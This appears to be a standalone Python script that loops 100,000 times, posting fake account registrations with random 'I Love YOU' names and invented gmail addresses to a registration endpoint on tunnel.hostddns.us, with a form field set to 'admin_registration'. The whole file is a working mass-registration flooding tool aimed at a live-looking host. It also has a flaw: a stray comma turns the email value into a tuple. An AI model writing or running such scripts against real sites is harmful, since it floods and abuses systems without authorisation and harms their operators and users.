import requests

import random
import string


def rand_string(length):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))


url_post = "https://tunnel.hostddns.us/register_account"

for x in range(100000):
    email = "i.love.you1" + rand_string(5) + "@gmail.com",
    p = requests.post(
        url=url_post,
        data={
            "firstname": "I Love YOU " + rand_string(3),
            "lastname": "I Love YOU " + rand_string(3),
            "user": "I Love YOU " + rand_string(10),
            "email": email,
            "conf_email": email,
            "pass": email,
            "conf_pass": email,
            "agree": "on",
            "form_submission": "admin_registration",
        },
    )
    print(p.text)
